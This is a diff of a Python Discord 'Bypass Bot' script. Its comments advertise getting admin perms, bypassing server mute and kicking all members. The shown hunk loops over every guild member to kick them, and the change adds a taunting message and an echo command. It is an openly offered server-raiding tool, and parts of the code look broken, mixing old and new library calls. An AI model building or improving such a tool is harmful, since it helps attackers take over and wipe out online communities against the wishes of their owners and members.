@@ -1,7 +1,7 @@
 #Created by Mason - m._#0558
 #Bypass Bot for multiple use cases on DISCORD... Getting Admin, Bypassing server mute, Kicking all members and such...
 
-# '<ka for kick'  '<l for admin perms'  '<speak for unserver mute'  '<back for roles in "sexy server" '
+# '<ka for kick'  '<l for admin perms'  '<speak for unserver mute'  '<back for roles in "sexy server"' '<say to echo what you say'
 
 import discord
 from discord.ext import commands
@@ -31,7 +31,8 @@ async def ka(ctx):
         for user in list(ctx.message.guild.members):
             try:
                 await client.kick(user)
-                print ("User " + user.name + " has faced thanos in " + ctx.message.guild.name)
+                await ctx.send(user,"has been snapped out of existence")
+                print ("User " + user + " has faced thanos in " + ctx.message.guild.name)
             except:
                 pass
         print ("Action Completed: KickAll")
